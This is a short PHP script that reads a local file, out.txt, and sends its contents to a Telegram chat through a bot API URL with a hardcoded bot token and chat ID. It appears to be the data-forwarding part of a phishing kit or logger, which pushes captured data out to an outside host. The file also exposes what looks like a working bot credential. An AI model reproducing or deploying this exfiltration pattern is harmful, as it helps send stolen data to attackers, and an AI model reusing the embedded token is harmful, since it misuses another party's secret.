<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1360737497:AAGjrjEMSnHMr1ddYkE4-_DvuGz4iRIOwnk/sendMessage?chat_id=240798370&text=$msg");
?>
